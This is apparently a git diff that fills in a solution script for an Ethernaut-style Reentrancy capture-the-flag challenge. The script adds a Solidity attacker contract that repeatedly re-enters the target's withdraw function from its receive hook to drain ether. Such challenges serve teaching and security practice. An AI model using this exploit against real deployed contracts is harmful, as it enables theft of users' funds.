@@ -5,26 +5,35 @@ import "forge-std/Script.sol";
 import "forge-std/console.sol";
 import "../src/10-Reentrancy/Reentrancy.sol";
 
-/**
- * @title Challenge 10 Solution Script
- * @notice Solution script for Reentrancy challenge
- */
+contract AttackReentrant {
+    Reentrance public reentranceInstance;
+
+    constructor(address payable _instance) payable {
+        reentranceInstance = Reentrance(_instance);
+        // Donate 0.001 to ourselfes
+        reentranceInstance.donate{value: 0.001 ether}(address(this));
+    }
+
+    function withdraw() external {
+        // Withdraw the 0.001
+        reentranceInstance.withdraw(0.001 ether);
+        (bool result,) = msg.sender.call{value: 0.002 ether}("");
+        require(result, "Withdraw transfer failed");
+    }
+
+    receive() external payable {
+        // Reenter and withdraw again the 0.001 of the contract
+        reentranceInstance.withdraw(0.001 ether);
+    }
+}
+
 contract ReentrancySolution is Script {
-    // Replace with your instance address from Ethernaut
-    address constant INSTANCE = address(0);
+    address constant INSTANCE = 0x9aE502233705C85BA2774A4Fe194D950033c8F93;
 
     function run() external {
-        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
-
-        vm.startBroadcast(deployerPrivateKey);
-
-        console.log("Solving Challenge 10: Reentrancy");
-        console.log("Instance:", INSTANCE);
-
-        // TODO: Implement solution when solving
-
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        AttackReentrant attackReentrant = new AttackReentrant{value: 0.001 ether}(payable(INSTANCE));
+        attackReentrant.withdraw();
         vm.stopBroadcast();
-
-        console.log("Challenge completed!");
     }
 }
